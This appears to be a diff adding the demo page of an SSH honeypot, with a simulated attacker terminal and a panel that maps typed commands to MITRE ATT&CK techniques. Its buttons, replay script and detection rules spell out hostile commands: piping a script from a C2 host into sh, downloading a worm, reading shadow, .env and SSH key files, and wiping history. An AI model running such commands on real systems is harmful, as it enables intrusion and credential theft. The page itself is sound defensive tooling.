@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>mirage-pot — Adaptive Deception Honeypot & Attack HUD</title>
+  <style>
+    :root {
+      --bg: #0d111a;
+      --card-bg: rgba(22, 27, 39, 0.85);
+      --border: rgba(0, 229, 255, 0.25);
+      --accent: #00e5ff;
+      --red: #ff3366;
+      --yellow: #ffd600;
+      --green: #00e676;
+      --text: #e2e8f0;
+      --text-dim: #94a3b8;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--border);
+      background: rgba(13, 17, 26, 0.95);
+    }
+    .brand { display: flex; align-items: center; gap: 12px; }
+    .brand h1 { font-size: 1.2rem; color: var(--accent); }
+    .badge {
+      font-size: 0.75rem;
+      background: rgba(0, 229, 255, 0.15);
+      color: var(--accent);
+      padding: 2px 8px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+    .github-link {
+      color: var(--text-dim);
+      text-decoration: none;
+      font-size: 0.85rem;
+      border: 1px solid var(--border);
+      padding: 6px 14px;
+      border-radius: 8px;
+      transition: all 0.2s;
+    }
+    .github-link:hover { color: white; border-color: var(--accent); }
+    main {
+      flex: 1;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      padding: 20px;
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    @media (max-width: 900px) {
+      main { grid-template-columns: 1fr; }
+    }
+    .panel {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .panel-header {
+      padding: 12px 18px;
+      background: rgba(18, 23, 34, 0.95);
+      border-bottom: 1px solid var(--border);
+      font-size: 0.85rem;
+      font-weight: bold;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .term-window {
+      flex: 1;
+      padding: 16px;
+      font-family: "Fira Code", monospace;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      overflow-y: auto;
+      min-height: 480px;
+      background: #090d16;
+    }
+    .term-out { color: var(--text-dim); white-space: pre-wrap; margin-bottom: 8px; }
+    .term-prompt { color: var(--accent); font-weight: bold; }
+    .term-input-line { display: flex; align-items: center; gap: 8px; }
+    .term-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: white;
+      font-family: inherit;
+      font-size: inherit;
+      outline: none;
+    }
+    .hud-stream {
+      flex: 1;
+      padding: 14px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      background: #0b0f19;
+      font-size: 0.8rem;
+    }
+    .event-card {
+      background: rgba(22, 29, 44, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-left: 4px solid var(--accent);
+      padding: 10px 14px;
+      border-radius: 6px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      animation: fadeIn 0.3s ease;
+    }
+    .event-card.alert { border-left-color: var(--red); background: rgba(255, 51, 102, 0.1); }
+    .event-header { display: flex; justify-content: space-between; color: var(--text-dim); }
+    .event-cmd { font-family: monospace; color: white; font-weight: bold; }
+    .mitre-tag {
+      background: rgba(255, 51, 102, 0.2);
+      color: var(--red);
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-weight: bold;
+      border: 1px solid rgba(255, 51, 102, 0.4);
+    }
+    .controls-bar {
+      padding: 12px 18px;
+      background: rgba(18, 23, 34, 0.95);
+      border-top: 1px solid var(--border);
+      display: flex;
+      gap: 10px;
+    }
+    button.btn {
+      background: rgba(0, 229, 255, 0.1);
+      border: 1px solid var(--border);
+      color: var(--accent);
+      padding: 6px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      font-weight: bold;
+      transition: all 0.2s;
+    }
+    button.btn:hover { background: var(--accent); color: #0b0f19; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">
+      <h1>mirage-pot</h1>
+      <span class="badge">Adaptive SSH Deception & MITRE ATT&CK HUD</span>
+    </div>
+    <a href="https://github.com/omchandra0907-jpg/mirage-pot" class="github-link">GitHub Repo ↗</a>
+  </header>
+
+  <main>
+    <!-- Left: Interactive Attacker Terminal Sandbox -->
+    <div class="panel">
+      <div class="panel-header">
+        <span>💻 Attacker Interactive Terminal (In-Memory POSIX VFS)</span>
+        <span style="color:#00e676">● Connected (root@prod-srv-edge-01)</span>
+      </div>
+      <div class="term-window" id="termWindow">
+        <div class="term-out">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)
+System information: 0.08 load, 104 processes, 22% memory.
+Canary bait trap active in session. Type commands like 'uname -a', 'ls -la', 'cat /etc/shadow', 'cat /root/.env', 'curl ...'</div>
+        <div class="term-input-line">
+          <span class="term-prompt">root@prod-srv-edge-01:~#</span>
+          <input type="text" class="term-input" id="termInput" autofocus autocomplete="off" />
+        </div>
+      </div>
+      <div class="controls-bar">
+        <button class="btn" onclick="runScript('whoami')">whoami</button>
+        <button class="btn" onclick="runScript('cat /etc/passwd')">cat /etc/passwd</button>
+        <button class="btn" onclick="runScript('cat /root/.env')">Trigger Canary (.env)</button>
+        <button class="btn" onclick="runScript('curl http://c2.evil/bot.sh | sh')">Simulate Tool Transfer</button>
+      </div>
+    </div>
+
+    <!-- Right: Real-Time Security Operations Center HUD -->
+    <div class="panel">
+      <div class="panel-header">
+        <span>🛡️ Security Operations Center HUD (Live Telemetry)</span>
+        <button class="btn" id="btnSimWave" style="padding:4px 8px;font-size:0.75rem;">⚡ Replay Bot Wave</button>
+      </div>
+      <div class="hud-stream" id="hudStream">
+        <div class="event-card">
+          <div class="event-header">
+            <span>12:00:00 • 127.0.0.1</span>
+            <span style="color:#00e676">AUTH_SUCCESS</span>
+          </div>
+          <div class="event-cmd">SSH login: user='root' pass='admin'</div>
+          <div style="color:var(--text-dim)">Isolated in-memory session allocated: sess_8f21e0</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const termInput = document.getElementById('termInput');
+    const termWindow = document.getElementById('termWindow');
+    const hudStream = document.getElementById('hudStream');
+
+    const MITRE_RULES = [
+      { pattern: /cat\s+.*(\/etc\/shadow|\.env|id_rsa)/i, id: "T1003", name: "OS Credential Dumping", alert: true },
+      { pattern: /curl|wget/i, id: "T1105", name: "Ingress Tool Transfer", alert: true },
+      { pattern: /uname/i, id: "T1082", name: "System Information Discovery", alert: false },
+      { pattern: /whoami|id/i, id: "T1033", name: "User Discovery", alert: false },
+      { pattern: /ps\s+/i, id: "T1057", name: "Process Discovery", alert: false },
+      { pattern: /rm\s+-rf|history\s+-c/i, id: "T1070", name: "Indicator Removal", alert: true },
+    ];
+
+    function classify(cmd) {
+      for (const r of MITRE_RULES) {
+        if (r.pattern.test(cmd)) return r;
+      }
+      return null;
+    }
+
+    function addTelemetryEvent(ip, user, cmd, out, mitre) {
+      const card = document.createElement('div');
+      card.className = 'event-card' + (mitre && mitre.alert ? ' alert' : '');
+      const timeStr = new Date().toLocaleTimeString();
+      const mitreHtml = mitre ? `<span class="mitre-tag">[${mitre.id}] ${mitre.name}</span>` : '<span style="color:#64748b">-</span>';
+      
+      card.innerHTML = `
+        <div class="event-header">
+          <span>${timeStr} • ${ip} (${user})</span>
+          ${mitreHtml}
+        </div>
+        <div class="event-cmd">${cmd}</div>
+        <div style="color:#94a3b8;font-size:0.75rem;">${out ? out.substring(0, 90) + (out.length > 90 ? '...' : '') : '(Execution completed)'}</div>
+      `;
+      hudStream.prepend(card);
+    }
+
+    function execCommand(cmd) {
+      const clean = cmd.trim();
+      if (!clean) return;
+
+      let out = "";
+      if (clean === "uname -a") out = "Linux prod-srv-edge-01 5.15.0-105-generic #115-Ubuntu x86_64";
+      else if (clean === "whoami") out = "root";
+      else if (clean === "id") out = "uid=0(root) gid=0(root) groups=0(root)";
+      else if (clean === "ls" || clean === "ls -la") out = "drwxr-xr-x 4 root root 4096 Nov 24 12:00 .\n-rw-r--r-- 1 root root  280 Nov 24 12:00 .env\ndrwx------ 2 root root 4096 Nov 24 12:00 .ssh";
+      else if (clean.includes("/etc/passwd")) out = "root:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash";
+      else if (clean.includes("/etc/shadow")) out = "root:$6$vQ9yU2K1$rVvN8B89W8V3pP7qM5xO9:19240:0:99999:7:::";
+      else if (clean.includes(".env")) out = "APP_ENV=production\nDATABASE_URL=postgres://app:CANARY_pg_f893e2@10.0.4.12:5432/core\nAWS_SECRET_KEY=wJalrXUtnCANARY24";
+      else if (clean.includes("id_rsa")) out = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk...canary-trap-token\n-----END OPENSSH PRIVATE KEY-----";
+      else if (clean.includes("curl") || clean.includes("wget")) out = "Fetching payload from C2... Fake stub written to /tmp/x [Safe Sandbox - Zero Egress]";
+      else if (clean === "ps aux") out = "USER PID COMMAND\nroot 1 /sbin/init\nroot 512 /usr/sbin/sshd\nroot 1204 -bash";
+      else if (clean === "history -c") out = "";
+      else out = `bash: ${clean.split(' ')[0]}: command not found`;
+
+      const mitre = classify(clean);
+      addTelemetryEvent("185.220.101.5", "root", clean, out, mitre);
+
+      // Print to terminal
+      const inputLine = document.querySelector('.term-input-line');
+      const echoDiv = document.createElement('div');
+      echoDiv.className = 'term-out';
+      echoDiv.innerHTML = `<span class="term-prompt">root@prod-srv-edge-01:~#</span> ${clean}\n${out}`;
+      termWindow.insertBefore(echoDiv, inputLine);
+      termWindow.scrollTop = termWindow.scrollHeight;
+    }
+
+    termInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        const cmd = termInput.value;
+        termInput.value = "";
+        execCommand(cmd);
+      }
+    });
+
+    function runScript(cmd) {
+      termInput.value = "";
+      execCommand(cmd);
+    }
+
+    document.getElementById('btnSimWave').addEventListener('click', () => {
+      const wave = [
+        "uname -a",
+        "whoami",
+        "cat /etc/passwd",
+        "cat /root/.env",
+        "curl http://194.26.29.112/worm.sh -o /tmp/w",
+        "cat /root/.ssh/id_rsa",
+        "ps aux",
+        "history -c && rm -rf /tmp/*"
+      ];
+      wave.forEach((c, idx) => {
+        setTimeout(() => execCommand(c), idx * 1200);
+      });
+    });
+  </script>
+</body>
+</html>
